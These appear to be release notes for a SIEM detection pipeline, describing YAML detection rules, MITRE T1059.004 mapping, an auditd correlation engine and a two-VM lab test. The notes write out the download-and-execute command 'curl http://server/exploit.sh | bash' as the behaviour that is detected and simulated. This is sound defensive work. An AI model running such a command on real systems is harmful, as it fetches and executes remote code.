# Release Notes — v2.0.0

## Overview

v2.0.0 upgrades the SIEM detection pipeline from the legacy RuleEngine to a Detection-as-Code architecture. Security alerts are now created through YAML-based detection rules, risk scoring, MITRE ATT&CK mapping, suppression handling, and correlation support for fragmented Linux audit events.

This release keeps the legacy engine available only as a fallback/rollback option while making the YAMLDetectionEngine the primary detection path.

## Added

- Added YAMLDetectionEngine as the active security detection pipeline.
- Added Detection-as-Code rule support using YAML files.
- Added rule validation, field-based evaluation, risk scoring, and suppression handling.
- Added strict MITRE T1059.004 Unix Shell detection rule.
- Added lightweight CorrelationEngine for fragmented auditd process events.
- Added detection for network script download followed by shell execution.
- Added support for direct `curl http://server/script.sh | bash` detection using multi-event correlation.
- Added investigation evidence showing first event, second event, time delta, source URL, and MITRE mapping.
- Added `agent_id` support in logs and alerts for reliable host/agent mapping.
- Added MetricEngine and System Health Rules for CPU, RAM, Network In, and Network Out alerts.
- Added UI support for YAML, MetricEngine, and CorrelationEngine badges.
- Added risk score and MITRE metadata display on alert and investigation pages.

## Improved

- Preserved strict YAML T1059 detection while adding correlation support for real `curl | bash` behavior.
- Improved auditd parsing and event normalization for Detection-as-Code compatibility.
- Improved false-positive handling by requiring stronger suspicious behavior conditions.
- Improved alert investigation clarity with rule ID, risk score, MITRE technique, detection engine, and analysis findings.
- Improved agent compatibility by enriching incoming logs and metrics with agent identity and host metadata.
- Improved separation between security detection alerts and system health metric alerts.

## Changed

- Legacy RuleEngine is no longer the normal active detection path for security alerts.
- Metric-based alerts now use `MetricEngine` instead of being displayed as legacy alerts.
- T1059 detection now requires a stronger suspicious chain: shell + network tool + risky execution indicator.
- Parent process is treated as optional enrichment instead of a mandatory field.

## Verification

Validated using a two-VM lab:

- Threat Actor VM hosted a harmless `exploit.sh` payload.
- Monitored Victim VM ran direct `curl http://server/exploit.sh | bash`.
- CorrelationEngine created a high-risk T1059.004 alert.
- Investigation page displayed:
  - Detection Engine: CorrelationEngine
  - Rule ID: `linux_t1059_download_then_shell_execution`
  - Risk Score: 70
  - MITRE Technique: T1059.004
  - Affected Agent: prod1
  - First event: curl download
  - Second event: bash execution
  - Time delta: approximately 0.31 seconds

Known Limitations
CorrelationEngine currently uses an in-memory rolling buffer. For production-scale deployment, this should be migrated to Redis Streams, PostgreSQL event windows, or another persistent event-correlation backend.
SOAR actions remain simulation-oriented for safety.
AnomalyEngine implementation is planned as the next phase.
